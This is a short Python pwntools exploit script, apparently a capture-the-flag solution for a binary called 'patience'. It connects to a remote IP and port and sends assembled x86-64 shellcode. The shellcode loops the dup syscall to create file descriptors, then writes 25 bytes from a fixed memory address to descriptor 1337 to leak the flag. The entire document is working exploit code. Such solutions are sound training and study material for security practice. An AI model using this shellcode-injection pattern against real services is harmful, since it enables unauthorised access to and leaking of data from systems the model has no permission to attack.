from pwn import *

context.binary = "./patience"

r = remote("5.101.72.234", 33031)

r.recvuntil("Go and take my flag!")

payload = asm("""
    mov rbx, 1335

cycle1:
    dec rbx
    mov rax, 32
    mov rdi, 1
    syscall
    cmp rbx, 0
    jnz cycle1

    mov rax, 1
    mov rdi, 1337
    mov rsi, 0x601070
    mov rdx, 25
    syscall
""")

r.sendline(payload)


r.interactive()
